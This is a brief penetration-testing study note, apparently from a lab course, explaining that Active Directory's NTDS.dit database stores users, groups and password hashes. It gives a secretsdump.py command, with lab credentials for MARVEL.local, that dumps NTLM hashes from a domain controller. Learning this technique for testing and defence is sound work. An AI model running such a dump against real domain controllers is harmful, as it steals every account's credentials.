## **NTDS.dit Overview**

### **What is it ?**

- A database used to store AD data. This data includes:
	- User information
	- Group information
	- Security descriptors
	- And oh yeah, password hashes


## **General Usage**

We can use the tool `secretsdump.py` to dump out the NTDS.dit secrets

```powershell
# secretsdump.py <domain/user>:'password'@DC-IP-ADDRESS -just-dc-ntlm
$ secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.0.149 -just-dc-ntlm

```